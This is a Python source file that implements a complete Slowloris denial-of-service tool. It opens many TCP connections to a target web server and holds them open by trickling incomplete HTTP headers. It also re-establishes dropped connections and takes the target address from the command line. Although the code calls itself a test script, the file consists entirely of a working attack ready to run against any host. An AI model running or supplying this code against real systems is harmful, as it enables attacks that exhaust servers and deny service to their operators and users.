import socket
import time
import random
import sys

def create_slowloris_socket(target_ip, target_port):
    """Initializes a TCP connection and transmits incomplete HTTP headers."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, target_port))
        
        # Send partial HTTP request header (omitting the final \r\n\r\n sequence)
        s.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

def run_slowloris_simulation(target_ip, target_port=80, socket_count=100, interval=10):
    """Main loop: Maintains stalled connection states by sending periodic header fragments."""
    print(f"[+] Initializing Slowloris test script against target {target_ip}:{target_port}")
    print(f"[+] Establishing {socket_count} persistent connection sockets...")
    
    sockets = []
    
    # Phase 1: Establish socket pool
    for i in range(socket_count):
        s = create_slowloris_socket(target_ip, target_port)
        if s:
            sockets.append(s)
        if (i + 1) % 20 == 0:
            print(f"[*] Connected {len(sockets)} / {socket_count} sockets...")
            
    print(f"[+] Connected {len(sockets)} stalled sockets.")
    print(f"[+] Injecting periodic header fragments every {interval}s to hold thread state...\n")
    
    # Phase 2: Send periodic header fragments to prevent idle connection timeout
    try:
        while True:
            active_sockets = 0
            for s in list(sockets):
                try:
                    # Transmit incomplete header payload to reset web server idle timer
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    active_sockets += 1
                except socket.error:
                    sockets.remove(s)
                    
            print(f"[*] Connection state maintained: {active_sockets} active sockets.")
            
            # Re-establish dropped connections if blocked or timed out
            while len(sockets) < socket_count:
                s = create_slowloris_socket(target_ip, target_port)
                if s:
                    sockets.append(s)
                else:
                    break
                    
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n[-] Test script terminated. Closing remaining sockets...")
        for s in sockets:
            s.close()

if __name__ == "__main__":
    # Command-line invocation arguments: python slowloris_attack.py <TARGET_IP> <PORT> <SOCKET_COUNT>
    target_host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    num_sockets = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    
    run_slowloris_simulation(target_host, target_port, num_sockets)